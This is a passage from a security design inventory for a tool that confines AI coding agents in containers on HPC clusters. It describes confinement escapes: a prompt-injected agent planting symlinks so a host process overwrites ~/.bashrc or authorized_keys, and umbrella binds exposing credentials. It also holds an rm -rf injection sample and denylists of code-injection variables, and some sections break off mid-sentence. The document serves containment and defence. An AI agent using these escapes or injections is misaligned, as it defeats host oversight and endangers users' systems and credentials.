credential-shaped / forged. (Closes the earlier gap where CA-bundle /
interpreter-routing vars — `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `PERL5LIB`,
`PYTHONHOME`, … — crossed despite being denylisted.) A finer PER-PLUGIN grant
(which would let an admin drop the scalar runtime-root vars from this exemption)
is the remaining future work; the residual is bounded + documented, not silently
allowed.

## 4h. Module software-root binds (caps.modules_software_roots, #160)

`module load` on the host sets `PATH`/`LD_LIBRARY_PATH`/etc. pointing at host
dirs (e.g. `/apps/python/3.11/{bin,lib}`); without binding those dirs the
module-loaded software is **unreachable** inside the container. The
**hpc-modules** plugin's `caps.modules_software_roots` capability binds them
**read-only at their original paths**. This is a new host→container bind class,
so it carries the full umbrella-bar (DN-003):

- **Trust anchor = root-owned SitePolicy ONLY.** The ceiling is
  `mounts.cluster_software_roots` from `/etc/botainer/policy.yaml`. It is taken
  **verbatim from the site policy** in `policy.intersect()` (NOT
  intersected with the user-writable `cluster.yaml`/user policy — that would let
  a user widen it = self-grant on a multi-tenant cluster, and a default-empty
  user list would zero an admin-set ceiling). **An empty SITE ceiling is no
  longer OFF:** `software_root_ceiling` falls back to the cluster profile's
  `cluster.software_roots` when no administrator set one (#156), and #171
  binds a DECLARED root with no `module load` in the picture. The one-way
  rule is unchanged and is the part that matters: a site ceiling, when set,
  WINS and a profile cannot widen it. Corrected 2026-09-04 — the claim was
  already stale from #156 and wiring #171 widened the gap. **Not silent (audit T1):** when
  `module load` ADDED dirs but none survive the ceiling, both flows emit a
  loud WARNING (composition stderr; the sbatch login-node confirmation shows an
  explicit OFF line) naming the dropped dirs + the remediation (admin adds the
  root to `mounts.cluster_software_roots`) — so the user isn't left thinking
  module software is reachable when it isn't.
- **Cap-gated, fail-closed.** Composition honors the binds only when the
  contributing plugin's manifest declares `caps.modules_software_roots` (so the
  grant is trust-locked + tier-gated). A manifest that can't be loaded refuses
  the contribution (mirrors the #125 pre_session bind-envelope discipline).
- **Baseline-diff.** Only dirs `module load` ADDED (post-load minus post-purge
  baseline) are candidates — a pre-existing poisoned `PATH=/home/victim` is in
  the baseline and is never bound.
- **Path-var allowlist.** Only a curated location-var set is diffed
  (`PATH`/`LD_LIBRARY_PATH`/`LIBRARY_PATH`/`CPATH`/`CMAKE_PREFIX_PATH`/
  `PKG_CONFIG_PATH`/`MANPATH`/`INFOPATH`/`CUDA_HOME`/`CUDA_PATH`/`MPI_HOME`/
  `OMPI_DIR`/`JAVA_HOME`/`R_HOME`); `PYTHONPATH`/`PYTHONHOME`/`R_LIBS_USER`/
  `JULIA_DEPOT_PATH` are EXCLUDED so a modulefile can't redirect package routing
  or smuggle a bind.
- **Never an umbrella.** Each candidate is realpath'd (symlink-farm hardening),
  must clear a container-owned-FHS denylist (`/usr`, `/bin`, `/lib*`, `/etc`,
  `/var`, …) AND the sensitive-per-user denylist (`~/.ssh`, `~/.gnupg`, `~/.aws`,
  `~/.azure`, `~/.kube`, `~/.docker` — mirrors the mount-plan validator's
  `SENSITIVE_USER_HOME_SUBPATHS`), meet a min-depth floor (default 2), and sit
  within a policy prefix (matched against literal AND realpath). Structurally
  cannot collapse to `/` even under a misconfigured shallow prefix. **No
  common-ancestor widening** (conservative v1 — bin/lib/include arrive via their
  own path-var diffs).

  The derived software-root system denylist compares its prefixes in both
  their literal and resolved forms.
  This includes macOS aliases such as `/etc` → `/private/etc` and `/var` →
  `/private/var`; resolving a candidate does not remove that denial. This
  correction changes no software-root capability or policy ceiling.
- **RO identity binds** (`source == target`), never rw. The bound path is the
  candidate's **realpath** (symlink-resolved). On a symlink-farm cluster
  (`/apps` → `/vast/...`) the bind target is therefore the resolved `/vast`
  path, which may differ from the `/apps` path the module env names — making the
  tool reachable by realpath but possibly not by its `/apps` name. Binding the
  literal symlink path as well is a tracked #214 item (gated on real-cluster
  confirmation of apptainer's symlink-bind behavior).
- **Loud `max_roots` ceiling** (default 8): exceeding it RAISES — never silent
  truncation (a dropped root = an unreachable binary with no signal).
- **The denylists live in the SHARED derivation** (`module_binds.py`), so BOTH
  flows refuse system roots + sensitive home dirs at the single chokepoint — not
  via per-flow backstops that could drift (the sbatch frozen-plan validator
  `_reject_unsafe_software_root` is then only a syntactic `--bind`-injection
  guard; it does not need to re-implement the semantic denylist). On the
  composition (docker/direct-apptainer) flow, `validate_mount_plan` ALSO runs
  after derivation (the `DENYLISTED_SOURCES/TARGETS` + #183 realpath check) as a
  second, independent backstop.

**Two flows, one derivation** (`botainer/hpc/module_binds.py::
derive_software_root_binds`, stdlib-only):
- **docker + direct apptainer:** `composition.run_host_pre_launch_hooks` reads
  the hook's raw `software_root_env` contribution, derives, adds the binds to
  `spec.mount_plan` (§1 / §2 table rows). The hpc-modules HOOK is standalone
  (`/usr/bin/env python3`; may lack botainer deps on a login node) so it only
  EMITS the raw baseline/loaded env — the trusted launcher derives.
- **sbatch:** the submit path runs the same hook on the host (NOT in
  `make_plan`, which stays side-effect-free — it runs explicitly once the mode
  is known, fail-loud only on a real submit/here, lenient for `--dry-run`/
  attach) and `to_apptainer_argv` emits `--bind=<r>:<r>:ro` on the **OUTER**
  argv (the inner `--in-container` launcher skips the adapter and can't add
  binds — and the inner host_pre_launch hook is **skipped** in-container, since
  re-sourcing Lmod there would refuse the session). Bound unconditionally so
  apptainer fails LOUD if a root is absent on the compute node (Q4; a silent
  skip = unreachable binary). Each root is re-validated at the frozen-
  `SubmissionPlan` chokepoint (`_reject_unsafe_software_root`, syntactic).
  The captured **module env** is ALSO propagated on this path: the submit path
  writes the hook's env file under the bound per-project state and passes
  `botainer start --module-env-file <path>` to the inner agent, which PREPENDS
  the path-list vars (PATH/LD_LIBRARY_PATH/…) onto the container's own values
  and SETS scalars — re-validated at the inner sink (§4i). So module software is
  reachable by name, not only by absolute path. End-to-end acceptance on a real
  cluster is tracked (#214); the mechanism is wired.

**Residual risk (admin-policy discipline):** anything an admin lists in
`mounts.cluster_software_roots` that is both within the ceiling AND a co-tenant-
readable shared dir is bound ro into the container. This is the admin's
deliberate choice (shared cluster software is the use case); the launcher cannot
distinguish "shared toolchain" from "shared secrets dir" beyond the system-root
denylist + min-depth floor. Admins should point the ceiling at software trees
(`/apps`, `/software`, `/opt/<pkg>`), not home/scratch roots.

## 4i. `start --module-env-file` (sbatch module env → inner agent, gated)

Sibling of the §4g `host_pre_launch` env_file channel, for the **sbatch** path
only. On the direct/docker path the module env reaches the agent via the
adapter's `--env-file` (after `--cleanenv`).

> **⚠ HPC-PARITY DEFAULT-REFUSAL (re-audit round 3, #1 — tracked #216,
> internal design note DN-005; Step A + Step B opt-in landed
>).** `--env-file` under `--cleanenv` **SETs (replaces)** each var,
> so on the direct/docker path a module env-file's path-list vars (`PATH`,
> `LD_LIBRARY_PATH`, …) **would clobber** the container's own values —
> dropping the agent binary's dir and breaking the launch with a confusing
> `<agent>: not found`. **The launcher REFUSES** the launch at compose time
> when path-list vars are present in a host_pre_launch env_file on the
> direct/docker flow (`composition._handle_module_env_path_clobber`),
> surfacing the constraint when the user can do something about it. The
> **sbatch** path PREPENDS (below) and is unaffected.
>
> Two opt-outs:
>   - **`BOTAINER_ALLOW_PATH_CLOBBER=1`** — reproduces the prior warn-and-
>     continue (emergency escape valve; agent may fail to start).
>   - **`BOTAINER_USE_INNER_PREPEND=1`** — **Step B**: composition splits the
>     env_file into a scalar-only sibling file (PATH-list vars removed) and a
>     list of `(var, value)` prepends on `spec.module_env_path_prepends`. The
>     docker/apptainer adapter then passes each value via `--env/-e
>     _BOTAINER_PREPEND_<NAME>=<val>` AND wraps the entrypoint in a
>     `bash -c '<trampoline>' bash <wraps>` argv. The trampoline (single
>     source of truth in `botainer/adapters/_inner_prepend.py`) reads each
>     helper var and PREPENDS its value onto the container's existing var
>     (matching the sbatch flow's `cli/start._apply_module_env_file`
>     semantics; the var set is locked in lockstep by a drift test).
>     Container PATH = mod-load-prepend + image-PATH; /opt/conda/bin is
>     preserved. Will become default after `#214` real-cluster acceptance.
>
> Value safety: `--env`/`-e` does not shell-interpret values (one argv
> element); the trampoline uses fully-quoted bash parameter expansions
> (`"$pv"`) so values are treated as LITERAL STRINGS — no word-split, no
> glob, no command substitution. A hostile module value containing
> `$(rm -rf /)` is propagated to PATH as the literal string, never
> evaluated. Values are also validated by `_validate_host_env_text` before
> reaching here.

On the sbatch path the inner
`botainer start --in-container` runs INSIDE the container where Lmod is absent,
so its `host_pre_launch` hook is **skipped** (re-running it would refuse the
session — adversarial-review B1). Instead the host submit path captures the
module env (the same hpc-modules hook, run once on the host) into a file under
the bound per-project state and passes `start --module-env-file <path>`.

`botainer/cli/start.py::_apply_module_env_file` (the inner sink) then:
- **re-validates the contents** with the SAME chokepoint the direct path uses
  (`composition._validate_host_env_text` — it reads the file itself so a missing
  file degrades (warn+continue) while hostile contents Refuse: execution-injection
  vars — LD_PRELOAD/BASH_ENV/GIT_SSH_COMMAND/… — botainer-managed routes, the
  policy env_var_denylist, and credentials are refused; keys must be plain
  identifiers). The host's own filtering is NOT trusted.
- **PREPENDS** path-list vars (`PATH`, `LD_LIBRARY_PATH`, `LIBRARY_PATH`,
  `CPATH`, `CMAKE_PREFIX_PATH`, `PKG_CONFIG_PATH`, `MANPATH`, `INFOPATH`) onto
  the container's existing values (dedup, order-preserving) so the container's
  own entries — notably the agent binary's dir — are PRESERVED, never clobbered.
  Scalar module vars (`CUDA_HOME`, `JAVA_HOME`, …) are SET.
- applies BEFORE `spec.env`, so botainer-managed routes still win on conflict.

The path is validated at the frozen `SubmissionPlan`
(`_reject_unsafe_module_env_file`: absolute, no `..`, no control chars) and is
only honored with `--in-container`. The file lives under the per-project state
subtree (already identity-bound), so no extra bind is added.

## 4k. In-container `module load` (caps.modules_inner_load)

The alternate hpc-modules mode: instead of (or alongside) capturing a host
`module load` at submit time, bind the **Lmod install tree** and the
**MODULEPATH directories** RO into the container so the AGENT runs
`module load foo` itself — dynamic, batch-job friendly (a sbatch job script
can load different software per stage instead of predicting everything at
submit time).

**Trust anchor (SITE-ONLY, identical discipline to §4h):** two new
root-owned SitePolicy fields, taken VERBATIM from `/etc/botainer/policy.yaml`
in `intersect()` (never intersected with — and never widenable by — the
user policy):

```yaml
mounts:
  cluster_lmod_root: /apps/lmod/lmod          # the Lmod install tree ("" = OFF)
  cluster_modulepath_roots: [/apps/modulefiles]  # dirs `module avail` searches
```

**What is added when ON** (both flows; empty `cluster_lmod_root` → feature
OFF, no binds, no env):

| Surface | Value |
|---|---|
| Bind (ro, identity) | `cluster_lmod_root` |
| Bind (ro, identity) | each `cluster_modulepath_roots` entry (deduped) |
| Env `LMOD_PKG` | `<lmod_root>` |
| Env `LMOD_DIR` / `LMOD_CMD` | `<lmod_root>/libexec[/lmod]` |
| Env `MODULEPATH` | the roots, colon-joined |
| Env `BASH_ENV` | `<lmod_root>/init/bash` |

`BASH_ENV` is normally on the env_var_denylist (execution-injection vector).
Here it is a **launcher-owned invariant**: the value is derived from the
root-owned SitePolicy ceiling in trusted composition code and points at the
RO-bound Lmod init script — no user/config/hook input reaches it. The
denylist continues to refuse `BASH_ENV` from cfg.env, plugin contributions,
and module env-files. A user-set `MODULEPATH` in cfg.env wins over the
launcher value (opt-out).

**Flow 1 (docker / direct apptainer):** `composition.
_compute_inner_load_contribution` — requires an enabled plugin declaring
`caps.modules_inner_load` AND the non-empty SitePolicy ceiling; binds run
through `validate_mount_plan` as the independent backstop.

**Flow 2 (sbatch):** `host_helper/_common._inner_load_contribution_for_plan`
(same cap-grant + ceiling conditions, standalone-mirror discipline) →
`SubmissionPlan.lmod_root`/`.modulepath_roots` (validated at the frozen plan
by `_reject_unsafe_software_root` — the §4b/§4c chokepoint pattern) → OUTER
apptainer argv `--bind`/`--env` lines → disclosed to the inner spec via a
**dedicated `--inner-load-bind` channel** (`start._inject_disclosed_inner_load_binds`).
This is SEPARATE from the `--software-root-bind` disclosure (§4h) on purpose:
those paths are DERIVED from a module-load env diff (attacker-influenceable)
so their guard refuses any system subtree; the inner-load Lmod/MODULEPATH
roots come VERBATIM from the root-owned SitePolicy, so their guard permits a
DEEP admin-named system-subtree path (e.g. `/usr/share/lmod/lmod`, the EPEL
RPM default). Without this split, the sbatch inner launcher would CRASH on
`/usr`-based Lmod installs while the docker flow accepts them (a forbidden
HPC-parity asymmetry).

**Single shared guard across all three paths** —
`module_binds.is_unsafe_module_tree_source` runs in Flow 1 composition, the
Flow 2 sbatch resolver, AND the inner disclosure, so they enforce IDENTICAL
semantics (no standalone-mirror drift): refuse `/etc`-class subtrees
(`/etc`, `/proc`, `/sys`, `/dev`, `/boot`, `/root`, docker.sock),
sensitive-home dirs (`~/.ssh`, …), `..` traversal, and the bare root or a
shallow (< min-depth) system mount point (`/usr`, `/lib` — would shadow the
base image); permit a deep non-sensitive tree. Flow 1 additionally runs
`validate_mount_plan` as an independent backstop. Both flows tag the binds
`Provenance.PLUGIN` so `validate_mount_plan`'s PLUGIN-only allowlist
exemption applies (a `SITE_POLICY` provenance would be refused for a target
outside `extra_targets_allowlist`). The login-node consent surface prints
"in-container `module load`: ENABLED" + the bound trees.

**Admin path constraint:** point `cluster_lmod_root` /
`cluster_modulepath_roots` at `/apps`, `/opt`, or `/usr/share/lmod`-style
trees — NOT at `/etc/*` (Flow 1's `validate_mount_plan` source-denylist
refuses `/etc` sources) nor a user-writable directory (a co-tenant could
author modulefiles the agent would run).

**What the agent gains:** the ability to run any modulefile visible in
MODULEPATH. Modulefiles are admin-curated code that already executes as the
user on the host flow (the env-capture hook runs `module load` on the host);
this mode moves the same execution into the container — same blast radius
as an SSH'd cluster user, which is the existing trust baseline under
apptainer (the container user IS the host user). Residual: an admin who
points `cluster_modulepath_roots` at a user-writable directory lets any
co-tenant author modulefiles the agent might load — the ceiling must name
admin-managed trees only (same admin-discipline residual as §4h,
internal design note DN-005 #160 entry).

**Verification:** `SELFTEST_MODULE_INNER_LOAD` (registry); pinned by
`tests/unit/test_modules_inner_load.py` (ceiling-empty OFF, no-cap OFF,
bind/env shape, SITE-ONLY intersect, dedupe) and the Flow-2 plan/argv tests.

## 4l. SLURM output directional isolation (security-audit Finding 1)

> **Escape class this closes (CONFIRMED-PoC in v0.0.x; was PRESENT in
> v0.1.0).** `slurmstepd` writes a job's `--output`/`--error` **as the
> uncaged user**, in the host mount namespace, **following symlinks** (stock
> SLURM has no `O_NOFOLLOW`). If that path is in a directory the caged agent
> can write to, a prompt-injected agent pre-plants a symlink there and
> slurmstepd writes attacker-controlled content into an arbitrary host file
> (`~/.bashrc`, `~/.ssh/authorized_keys`) → full policy-cage escape +
> persistence. The general class: *a caged agent must never have write
> access to a path a host process (running as the uncaged user) later opens
> by a predictable, agent-influenced name.*

**Where it was.** The hpc-launcher wrote `#SBATCH --output=<state_root>/
state/<uuid>/sessions/_outputs/slurm-%j.out`, and `to_apptainer_argv` binds
`<state_root>/state/<uuid>` **RW** into the container — so `_outputs/` was
agent-writable. v0.1.0 uses `%j` (SLURM-assigned, not client-chosen), so the
exact-filename pre-plant needs a jobid; but the class still held via a
**directory** symlink on `_outputs` (no jobid needed).

**Fix (directional isolation — the audit's #1 recommendation).** SLURM
`--output`/`--error` now go to a **host-only** per-project dir,
`<state_root>/hpc-job-outputs/<uuid>/slurm-%j.out`, that is **never**
bind-mounted into the container (it is a sibling of `state/`, and only
`state/<uuid>` + specific subpaths are bound). The caged agent has **no
write path** there, so it cannot pre-position the target at all. Single
source of truth: `StatePaths.hpc_job_output_dir(uuid)` (botainer side, used
by `hpc logs`) and the standalone `host_helper/_common._job_output_dir`
(sbatch side) — kept in lockstep by
`tests/integration/test_hpc_output_isolation.py`. The agent never needs to
read its own SLURM output (its stdout IS that file); `hpc logs` reads it
host-side.

**Defense-in-depth (interim rec).** `prepare_host_paths` creates the dir
`0700` and applies a **symlink tripwire**: if the output dir (or its parent)
is already a symlink, it **refuses the submit with a loud message** — a
symlink there is near-unambiguous evidence of an attempted output-redirect.
(Belt-and-suspenders: since the dir isn't container-writable, the
directional isolation is the real control.)

**Residual / tracked (needs real cluster — #214-class).** The interim +
directional isolation close the demonstrated no-race pre-plant. Not yet done
(see internal design note DN-005): shrink blast radius further by giving
jobs a HOME that is not the user's real home; `--net` private netns; scrub
PID1 environ; seccomp — audit Findings 3–7, tracked as S2.

## 4m. `botainer selftest` probe is surface-NEUTRAL (T-F)

> **Why this is in the inventory even though it adds nothing.** The self-test
> exists *to verify this whole inventory holds at runtime*. For that to be
> meaningful the probe must exercise the **exact same cage** a real session
> gets — if the probe added or removed a single bind/env/cap it would measure
> a different cage than production (false assurance). So "adds nothing" is a
> load-bearing invariant, recorded here so a future change to the runner that
> silently alters the launch surface is caught by review.

**What it is.** `botainer selftest` (`botainer/cli/selftest.py`,
`botainer/preflight/runner.py`) composes the **real** SessionSpec for the
current project (same `compose_session` + `run_host_pre_launch_hooks` +
`run_pre_session_hooks` as `start`), then swaps ONLY the agent entrypoint for
a read-only POSIX-sh probe and launches a throwaway `--rm` container. The
probe checks the posture this document claims: RW/RO bind directionality,
caps dropped, no_new_privs, /etc/shadow unreadable, no `~/.ssh` key material,
no `BASH_ENV`/`LD_PRELOAD`, network NONE when policy says so, and a
mount-table readback.

**The surface-neutral claim, precisely.** The probe rides **argv only**, via
`entrypoint_wraps` (`spec.model_copy(update={"entrypoint_wraps":
(tuple(render_probe_args(spec)),)})`). This **replaces** the agent command —
it adds **no** bind, **no** `--env`/`--env-file`, **no** capability, **no**
network change, **no** port. `build_probe_plan` only *reads* the composed
binds/network to decide which checks to emit; it never mutates the plan. The
one adapter delta is a new **`interactive: bool` kwarg** on
`DockerAdapter.render_argv`: the self-test launches with `interactive=False`
(omit `-it`, keep `--rm`) so stdout is capturable; every other caller keeps
the default `True`. The apptainer adapter is unchanged (exec is already
non-interactive). No new bind/env/cap ⇒ nothing to add to §1/§2 inventories.

**Trust note (NOT authoritative in probe-fed mode).** The runner folds in
`run_host_readback` (§host.py) fed the **probe's own** `/proc/self/mounts`.
That is a *consistency* check on what the probe reported, **not** the
host-authoritative readback (which would source `docker inspect` /
host-side `/proc/<pid>/mounts`); the authoritative mode still awaits the
start.py post-launch wiring (Task #115). Exit codes: 0 all-pass, 3 runtime
error (compose refused / launch failed / no probe frame — never conflated
with a security failure), 4 ≥1 posture check FAILED.

## 4n. Shared-auth back-fill is content-validated per agent family (P3a)

> **Surface-neutral note (no bind/env/cap change).** The shared-auth binds
> (§1/§2 `/shared-auth/agent-<name>`) are unchanged; this records a
> credential-CONTENT hygiene tightening in the shared-mode `pre_session` hooks.

When a shared-mode session's per-project credential file is a real file rather
than the expected symlink (codex/claude atomically replaced the symlink during
an in-container token refresh), the hook may **back-fill** that content to the
host-owned shared credential. That back-fill is now gated on recognizing the
credential's actual shape, so an unrelated/poisoned JSON can't overwrite the
shared credential:
- **claude** (`agent-claude-shared`): `claudeAiOauth.accessToken` (`sk-ant-oat*`,
  ≥64) + `refreshToken` (`sk-ant-ort*`, ≥64) + positive `expiresAt`.
- **codex** (`agent-codex-shared`, P3a + Codex Priority-A MEDIUM): back-fill
  requires a FULL OAuth bundle (`tokens.{access_token,refresh_token,account_id}`)
  AND the `account_id` must MATCH the existing shared credential (a refresh of
  the same account, not a swap). API-key shape is NOT back-fillable at all (an
  API key isn't refreshed in-container). Otherwise → back up, not overwrite.
  (Was "non-empty dict", then "any OPENAI_API_KEY/access_token ≥20" — both
  forgeable by a caged agent to poison the shared credential.)

Fail-safe: an unrecognized file is **backed up, not back-filled** (the session
still runs off the existing shared cred). Pinned by
`tests/unit/test_codex_shared_auth.py`.

## 4w. Cross-node socket refusal covers plugin sockets — UNIX_SOCKET mode is preserved

> **A plugin's `"mode":"unix-socket"` bind keeps `BindMode.UNIX_SOCKET`, so
> `_refuse_cross_node_binds` can see it.** Mapping it to `RW` at the hook
> boundary makes the refusal DEAD for the exact plugins it targets — that is
> the mistake this section exists to prevent. Tightens enforcement; no
> widening.

`run_pre_session_hooks` mapped a plugin's `"mode":"unix-socket"` bind

at compose. Fix: keep `BindMode.UNIX_SOCKET` (composition.py). The renderer emits
the IDENTICAL bind for UNIX_SOCKET as for RW (`mount_plan/render.py:26,52` — a
plain `--bind`/`--mount`, no `:ro`), so docker/direct socket binds are unchanged;

and any future socket plugin.

## 4z. Proxy auth is NOT FUNCTIONAL at v0.1.0, and refuses early (#59)

> experimental. It refuses at the top of `start_proxy.py::main()` rather than

- **Truth-in-UI:** `capability_summary.py`, `cli/auth.py` (login/use/status +

## 4ab. Agent in-cage permission posture — bypass by default (#53)

> The agent runs inside the cage WITHOUT per-action permission prompts by
> default: the container is the boundary, not the prompt. **This is a WIDER
> in-cage autonomy than a prompting agent has**, which is why it is a
> first-class surface item rather than a silent default. Derivation and the
> bounds that still apply: internal design note DN-010.

**What changed.** Previously the caged agent ran with its stock *interactive*
permission prompts ON — which deadlocks a TTY-less HPC batch job (the product's
core use case). A config knob `agent_permissions` (default `bypass`), ceilinged
by site policy, sets the posture; **compose appends the posture's flag(s) to the
INNERMOST entrypoint wrap** (the tokens become the wrapper's `"$@"`, forwarded
to the agent CLI).

**Rebuild-independent (revision).** The flags are applied by the
LOGIN-NODE / launcher compose, NOT by logic inside the image's entrypoint
wrapper — so changing the posture does NOT require rebuilding the `.sif`/docker
image (the wrapper is a dumb `exec claude "$@"` forwarder, unchanged across
versions). The flags are a FIXED first-party table keyed on the agent family
(`botainer/core/agent_permissions.py`); a plugin selects WHICH row via its
family but cannot inject arbitrary flags, so `command_append` stays refused
(#290). `BOTAINER_AGENT_PERMISSIONS` is still set in the container env as a
posture signal, but nothing reads it to produce the flags.

### The vocabulary (revised 2026-09-21)

Two words mean the same thing for every agent. Everything else is **the agent's
own mode name**, passed through and validated against that agent's vocabulary —
botainer does not invent a parallel set of permission names.

| value | claude | codex |
|---|---|---|
| **`bypass`** (default) | `--dangerously-skip-permissions` | `--sandbox danger-full-access --ask-for-approval never` |
| **`default`** (`prompt` is a permanent alias) | *nothing appended* | `--sandbox danger-full-access` only |
| `acceptEdits` `auto` `plan` `manual` `dontAsk` `bypassPermissions` | `--permission-mode <value>` † | refused, naming what codex takes |
| `untrusted` `on-request` `never` | refused, naming what claude takes | pinned sandbox + `--ask-for-approval <value>` |
| `read-only` | refused | `--sandbox read-only -c features.use_legacy_landlock=true` |
| `workspace-write` | refused | **refused with the measurement** — see below |

† except `bypassPermissions`, which maps to `--dangerously-skip-permissions`:
the binary states that `--permission-mode bypassPermissions` additionally
requires `--allow-dangerously-skip-permissions`, and botainer passes the
single-flag spelling that has been shipping.

Validation is two-stage, and must be: at config parse the agent is NOT yet known
(`agent:` is a sibling field and `botainer start --agent` can override it), so
parse accepts the union of every agent's vocabulary and catches typos; compose
narrows to the selected agent and refuses a cross-agent value, naming what that
agent accepts. A value botainer cannot translate is **refused, never silently
dropped** (#128).

### Why codex's sandbox is pinned, and what that claim is now

The previous text here said codex's own sandbox "cannot nest inside an apptainer
cage (no nested user namespaces)". **That was too narrow in one direction and
too broad in the other**, and both halves are corrected by measurement
(codex-cli 0.145.0, run in a docker dev container, 2026-09-21):

- It is not apptainer-specific. The failure is any container that cannot create
  an unprivileged user namespace, which includes the docker case.
- It is not "codex's sandbox". codex ships **two** backends. Only the default
  (bubblewrap) needs a user namespace. The landlock backend needs none, and
  under it `read-only` both starts **and enforces** — a write returns
  `Permission denied` and the target file is unchanged.
- `workspace-write` fails on **both** backends: bubblewrap cannot start, and
  landlock refuses that mode outright ("permission profiles requiring direct
  runtime enforcement are incompatible with --use-legacy-landlock").

So codex's `default` pins `--sandbox danger-full-access` and this is a
**CHOICE**, not a physical constraint: `danger-full-access` is the only mode that
runs commands with codex's shipped default backend. Leaving the sandbox
unspecified produces an agent that launches, warns once, and then fails every
command — alive but crippled, which reads as working. `read-only` remains
available for anyone who wants a real inner boundary.

This is a **filter, not a structural guarantee**, and holds only while the
measurement holds. The project ships a host-side probe that re-measures it on any
machine. **Not yet measured under apptainer on an HPC compute node** — landlock
needs kernel ≥5.13 or a backport, which many clusters do not have.

An earlier claim that the agent images ship no bubblewrap, and that this was a
second independent reason to fail, is **withdrawn**: the npm package bundles its
own `codex-resources/bwrap`, and codex uses it when no system one is on PATH.

**Trust model — why this is safe.**
- The flag is injected by *trusted first-party* code (composition → env →
  image-baked wrapper), NEVER by a plugin. Plugin `command_append` remains
  refused (#290) precisely so an untrusted plugin can't add
  `--dangerously-skip-permissions`; this feature does not relax that.
- **Policy ceiling.** `agent.max_permissions` in the root-owned
  `/etc/botainer/policy.yaml` caps the posture (ordering: `prompt` < `bypass`).
  A multi-tenant admin can force `prompt` and compose_session refuses a project
  requesting `bypass` (fail-closed; `CAPABILITY_DENIED_BY_POLICY`). Intersection
  takes the most-restrictive across site ∩ user (mirrors the network ceiling).
- **Fail-closed parse.** Both the config field and the policy ceiling reject
  unknown values at parse (mirrors runtime + network.mode).
- **Loud disclosure.** The capability summary states the posture in plain words
  ("Permissions: BYPASS — the agent runs UNATTENDED, no prompts; the container is
  the only boundary") mirroring v0.0.x's startup banner. An operator cannot miss
  that prompts are off.

Pinned by `test_agent_permissions.py` (config/policy/compose/wrapper/summary end
to end) + the `test_inspect_field_coverage` pin (the spec field is
session-affecting and must surface in a human view).

## 4ac. `mounts.extra` source denylist is ancestor-aware (the umbrella-bind bar)

> **The source denylist matches ancestors, not just exact paths and children.**
> Without that, a git-shareable (untrusted) `.botainer/config.yaml` binds the
> **entire host filesystem rw** into the agent by naming a PARENT of a denied
> path — a confirmed HIGH, and the same class as internal design note DN-003.

**The bug.** `mounts.extra[]` is fail-closed on the TARGET (allowlist) but only
denylist-guarded on the SOURCE (`mount_plan/validation.py::_source_is_denied`).
The denylist matched only `source == denied` or `source` *under* a denied path —
so a caller could bind a directory *above* the denied path and reach the child:
- `source:/, target:/mnt` → `/mnt/etc/shadow`, `/mnt/root/.ssh` readable
  (`/` is not literally `/etc`, so the old check passed it).
- `source:$HOME, target:/data` → `~/.ssh`, `~/.aws` rw (the sensitive-subpath
  guard only fired on `startswith(home + "/")`, so the home dir ITSELF slipped).
Exploitable out-of-the-box: default `extra_targets_allowlist` is non-empty
(`/data /datasets /shared /scratch /mnt`), `trusted_source_roots` empty. On the
now-default `bypass` (TTY-less) path there's no interactive confirm to catch it.

**The fix.** `_path_is_related(candidate, protected)` now matches in BOTH
directions — `candidate` equal to / inside / **a parent of** `protected`. The
source check refuses a source that is an ancestor of any `DENYLISTED_SOURCES`
entry (so `/`, `/var`, `/var/run` are refused as parents of `/etc`, docker.sock)
or of any sensitive home subpath (so `$HOME`, `/home` are refused as parents of
`~/.ssh`), UNLESS the source resolves under an explicit root-owned
`trusted_source_roots` (the admin escape hatch is preserved). The source stays a
**denylist**, not a positive allowlist, by design — legitimate cluster data-dir
binds (`/scratch/gpfs/…`, `/data/…`) have no sane non-empty default allowlist, so
they must continue to work; the ancestor rule closes the umbrella holes without
breaking them.

- Refused (new): `/`, `/home`, `$HOME`, `/var`, `/var/run` as sources.
- Still allowed: `/host/data`, `/scratch/gpfs/proj`, `/var/lib/mydata`,
  `~/projects/foo` (non-sensitive, non-umbrella).
- Escape hatch: `trusted_source_roots: [<path>]` in the root-owned policy.
Pinned by `test_mount_validation.py::test_umbrella_source_over_denylisted_refused`
(`/`, `/var`, `/var/run`), `::test_home_directory_itself_as_source_refused`,
`::test_legit_non_sensitive_sources_still_accepted`,
`::test_trusted_source_root_reallows_home`.

## 4ad. Compose-time config trust — what each untrusted surface is checked for

> What each untrusted-input surface is checked for. The adapter argv and the
> HPC sbatch path are clean BY CONSTRUCTION — §4-cage flags are hardcoded and
> unreachable from config, every sbatch sink is charset/int/shlex-guarded, and
> the never-bare-job chokepoint is universal. Composition needed two guards:

**(a) Plugin `plugins_enabled` tier ceiling re-checked at COMPOSE (#64, LOW).**
`plugins.allowed_tiers` / `first_party_allowlist` were enforced at plugin INSTALL
time only; compose merely intersected config with the installed set. An admin who
TIGHTENED the policy after a plugin was installed (without uninstalling) left a
gap — a tampered config could still enable the now-disallowed plugin. Compose now
refuses a plugin whose install-time-recorded tier (`InstalledPlugin.tier`) is not
in the current `effective_policy.plugins.allowed_tiers`
(`PLUGIN_TIER_NOT_ALLOWED`). No re-hashing (respects the "no runtime
trust-hashing" decision) — it enforces the CURRENT ceiling against the RECORDED
tier. Every bundled manifest declares `first-party`, so no false-refuse under the
default `allowed_tiers=[first-party]`. Pinned:
`test_isolated_agent_launch.py::test_compose_refuses_plugin_tier_below_tightened_ceiling`.

**(b) pre_session env channel refuses exec-injection vars (MEDIUM).** The
pre_session env contribution channel gated only on `env_var_denylist` + the
credential-leak check — STRICTLY WEAKER than the sibling host_pre_launch env_file
gate (`_validate_host_env_text`). Force-code-load / resolver-hijack vars the code
recognizes elsewhere (`GCONV_PATH`, `GLIBC_TUNABLES`, `HOSTALIASES`,
`RES_OPTIONS`, `DYLD_*`, `BASH_ENV`, `GIT_SSH_COMMAND`, …) passed and crossed
`--cleanenv` as `--env`, so a compromised/malicious plugin could redirect name
resolution (HOSTALIASES → `api.anthropic.com`) or force-load code. The channel now
also refuses `_HOST_ENVFILE_EXEC_INJECTION` + non-identifier keys (BASH_FUNC_*),
matching the env_file gate. `_BOTAINER_MANAGED_ROUTES` (CLAUDE_CONFIG_DIR, …) is
deliberately NOT blanket-refused here — `agent-claude-shared` legitimately sets
`CLAUDE_CONFIG_DIR` via this channel; the existing overwrite-conflict guard bounds
it. Pinned: `test_run_hook_wiring.py::
test_run_pre_session_hooks_refuses_exec_injection_env_in_contribution` +
`::test_run_pre_session_hooks_still_allows_managed_route_from_agent_plugin`.

Two low nits from the sweep: (i) apptainer `--env` comma-split could set an extra
